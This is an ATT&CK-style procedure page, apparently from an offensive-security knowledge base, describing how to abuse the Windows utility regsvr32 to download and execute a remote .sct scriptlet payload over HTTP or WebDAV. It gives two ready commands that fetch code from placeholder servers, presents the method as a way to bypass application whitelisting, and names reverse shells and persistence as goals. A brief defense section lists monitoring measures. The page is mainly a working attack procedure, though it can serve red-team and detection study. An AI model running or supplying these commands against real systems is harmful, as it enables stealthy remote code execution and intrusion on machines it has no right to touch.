---
id: eaffaa28-5f1e-452f-b05b-8d5779df77d1
name: Windows-Download-and-Execute-via-Regsvr32
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:26.955305+00:00'
updated_at: '2023-04-10T20:37:09.926932+00:00'
tactics:
  - '[[tactics/Defense-Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - '[[techniques/Regsvr32|T1117 - Regsvr32]]'
sub_techniques: []
tags:
  - '[[tags/regsvr32]]'
  - '[[tags/windows-download-execute]]'
commands:
  - '[[commands/regsvr32-http-download-execute-sct]]'
  - '[[commands/regsvr32-webdav-download-execute-sct]]'
platforms:
  - Windows
tools: []
validated: true
---

# Windows-Download-and-Execute-via-Regsvr32

## Summary

This procedure uses the legitimate Windows utility regsvr32.exe to download and execute a remote payload specified in a .sct (Scriptlet) file. By abusing the /u flag for unregistering a DLL, it bypasses application whitelisting and executes arbitrary code from a remote location, such as an HTTP server or WebDAV share, without writing files to disk.

## Description

Regsvr32.exe is a built-in Windows command-line tool for registering and unregistering OLE controls and DLLs in the system registry. This technique exploits the /i parameter with the /u flag to load and execute a remote .sct file, which contains scriptlet code (similar to HTA files) that can run payloads like PowerShell scripts or other code. The process downloads the .sct file over HTTP or WebDAV, parses it, and executes its contents in memory. This is particularly useful in environments with strict application controls, as regsvr32 is typically whitelisted. The target environment is Windows systems (XP and later), requiring command execution privileges but no administrative rights for basic execution. Success results in the payload running silently, enabling further actions like reverse shells or persistence.

## Requirements

1. Access to a Windows target system with command execution capabilities (e.g., via initial access like phishing or RDP).
2. Ability to execute regsvr32.exe (built-in, no installation needed).
3. A remote server hosting the .sct payload file (HTTP or WebDAV accessible from the target).
4. Network connectivity from the target to the payload server.

## Defense

- Implement application whitelisting (e.g., AppLocker or WDAC) to restrict regsvr32.exe execution or monitor its use.
- Monitor command-line arguments for regsvr32.exe, especially /u /i with remote URLs via Sysmon or EDR tools.
- Use network segmentation and proxy filtering to block unauthorized downloads from external HTTP/WebDAV sources.
- Enable PowerShell logging and script block logging to detect executed payloads.

## Objectives

1. Download a remote .sct payload without writing to disk.
2. Execute the payload in memory to bypass security controls.
3. Achieve code execution for further post-exploitation activities.

## Instructions

### Step 1: Prepare the Remote .sct Payload

**Context**: Before execution, create and host a .sct file containing the desired payload (e.g., a PowerShell reverse shell). The .sct file uses XML with scriptlet syntax to define the executable code. Host it on an HTTP server or WebDAV share accessible by the target.

No specific command here; use a web server tool like Python's http.server or Apache to host the file.

> Ensure the .sct file is valid and tests successfully on a controlled environment to avoid syntax errors during execution.

### Step 2: Execute via HTTP Download

**Context**: Use regsvr32 to download and execute the .sct payload over HTTP. This step unregisters scrobj.dll (a benign system DLL) while loading the remote script, running it silently.

**Command** ([[commands/regsvr32-http-download-execute-sct]]):
```cmd
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
```

> This command downloads the .sct file from the specified HTTP URL, executes its contents, and unregisters scrobj.dll without displaying messages (/n and /s flags). Replace the URL with your payload location. Success is indicated by no error popups and the payload executing (e.g., a reverse shell connecting back).

### Step 3: Execute via WebDAV Download (Alternative)

**Context**: For environments blocking HTTP, use WebDAV (e.g., via SMB shares) to download the .sct file. This variation uses a UNC path for the payload location.

**Command** ([[commands/regsvr32-webdav-download-execute-sct]]):
```cmd
regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
```

> Similar to the HTTP variant, this loads the .sct from a WebDAV share. The double backslashes escape the UNC path. Monitor for network connections to the WebDAV server as a success indicator. If the payload includes network activity (e.g., beaconing), verify it occurs without errors.
